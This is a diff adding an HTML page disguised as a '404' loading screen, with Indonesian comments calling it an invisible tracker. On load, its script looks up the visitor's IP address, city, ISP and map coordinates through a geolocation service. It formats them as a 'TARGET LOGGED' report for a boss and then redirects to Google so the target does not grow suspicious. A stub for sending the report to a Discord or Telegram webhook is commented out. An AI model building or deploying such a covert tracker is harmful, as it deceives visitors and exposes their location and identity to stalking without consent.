@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sistem Error 404</title>
+    <script>
+        // Protokol CYBER ONX - Invisible Tracker
+        async function getIPData() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                
+                // Nyusun laporan buat Bos
+                const report = `
+                    🩸 TARGET LOGGED 🩸
+                    ------------------
+                    IP: ${data.ip}
+                    City: ${data.city}
+                    Region: ${data.region}
+                    Country: ${data.country_name}
+                    ISP: ${data.org}
+                    Map: https://www.google.com/maps?q=${data.latitude},${data.longitude}
+                `;
+
+                // Kirim hasil ke Webhook atau Log (Simulasi Log ke Console)
+                console.log(report);
+                
+                // Opsional: Kirim ke Webhook Discord/Telegram Bos di sini
+                // KirimDataKeBos(report);
+
+                // Biar target nggak curiga, alihin ke YouTube atau Google
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com";
+                }, 500);
+
+            } catch (error) {
+                window.location.href = "https://www.google.com";
+            }
+        }
+        window.onload = getIPData;
+    </script>
+</head>
+<body style="background-color: black; color: white; font-family: sans-serif; text-align: center; padding-top: 20%;">
+    <h1>Loading System...</h1>
+    <p>Please wait a moment.</p>
+</body>
+</html>
